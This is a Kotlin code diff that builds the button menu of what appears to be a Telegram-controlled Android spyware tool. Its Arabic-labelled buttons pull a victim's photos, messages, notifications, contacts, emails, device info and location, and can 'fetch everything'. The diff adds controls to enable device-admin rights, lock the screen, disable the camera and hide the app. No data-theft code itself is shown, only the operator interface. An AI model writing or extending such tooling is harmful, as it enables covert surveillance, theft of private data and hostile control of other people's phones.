@@ -5,44 +5,46 @@ import org.json.JSONObject
 
 object KeyboardBuilder {
 
-    /**
-     * قائمة الأزرار الرئيسية (Reply Keyboard — أسفل الشاشة)
-     */
     fun replyKeyboard(): JSONObject {
         val keyboard = JSONArray()
 
-        // الصف 1: الصور
         keyboard.put(JSONArray().apply {
             put(JSONObject().put("text", "📸 كل الصور"))
             put(JSONObject().put("text", "📸 آخر 50"))
         })
 
-        // الصف 2: الرسائل والإشعارات
         keyboard.put(JSONArray().apply {
             put(JSONObject().put("text", "📩 كل الرسائل"))
             put(JSONObject().put("text", "🔔 الإشعارات"))
         })
 
-        // الصف 3: جهات الاتصال والإيميلات
         keyboard.put(JSONArray().apply {
             put(JSONObject().put("text", "👥 جهات الاتصال"))
             put(JSONObject().put("text", "📧 الإيميلات"))
         })
 
-        // الصف 4: الجهاز والموقع
         keyboard.put(JSONArray().apply {
             put(JSONObject().put("text", "📊 معلومات الجهاز"))
             put(JSONObject().put("text", "📍 الموقع"))
         })
 
-        // الصف 5: تيك توك
         keyboard.put(JSONArray().apply {
-            put(JSONObject().put("text", "🎵 تيك توك"))
+            put(JSONObject().put("text", "🛡 تفعيل Admin"))
+            put(JSONObject().put("text", "🛡 معلومات Admin"))
         })
 
-        // الصف 6: جلب شامل
         keyboard.put(JSONArray().apply {
+            put(JSONObject().put("text", "🔒 قفل الشاشة"))
+            put(JSONObject().put("text", "📷 تعطيل الكاميرا"))
+        })
+
+        keyboard.put(JSONArray().apply {
+            put(JSONObject().put("text", "🎵 تيك توك"))
             put(JSONObject().put("text", "🚀 جلب كل شي"))
+        })
+
+        keyboard.put(JSONArray().apply {
+            put(JSONObject().put("text", "❌ إخفاء"))
         })
 
         return JSONObject().apply {
